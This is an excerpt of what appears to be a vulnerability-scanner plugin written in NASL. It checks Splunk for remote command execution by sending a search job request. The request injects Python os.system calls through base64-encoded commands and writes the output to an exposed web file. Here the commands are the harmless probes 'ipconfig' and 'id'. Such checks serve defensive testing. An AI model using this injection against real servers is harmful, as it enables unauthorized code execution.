...
func exploit( command, xsplunk, session, host ){
	url = "/en-GB/api/search/jobs";
	postData = NASLString( "search=search%20index%3D_internal%20source%3D%2Asplunkd.", "log%20%7Cmappy%20x%3Deval%28%22sys.modules%5B%27os%27%5D", ".system%28base64.b64decode%28%27", command, "aXBjb25maWc", "%2BImM6XHByb2dyYW0gZmlsZXNcc3BsdW5rXHNoYXJlXHNwbHVua1xzZ", "WFyY2hfbXJzcGFya2xlXGV4cG9zZWRcanNcLnRtcCI%3D%27%29%29%2", "2%29&status_buckets=300&namespace=search&ui_dispatch_app", "=search&ui_dispatch_view=flashtimeline&auto_cancel=100&r", "equired_field_list=*&earliest_time=&latest_time=" );
...
xsplunk = xsplunk[1];
if( ContainsString( tolower( os ), "windows" ) ){
	tmp = NASLString( ">\"", "c:\\\\program files\\\\splunk\\\\share\\\\splunk\\\\search_", "mrsparkle\\\\exposed\\\\js\\\\.tmp", "\"" );
	command = urlencode( str: base64( str: NASLString( "ipconfig", tmp ) ) );
	...
	command = urlencode( str: base64( str: NASLString( "id", tmp ) ) );
	req = exploit( command: command, xsplunk: xsplunk, session: session, host: host );
}
res = http_keepalive_send_recv( port: port, data: req );
sleep( 5 );
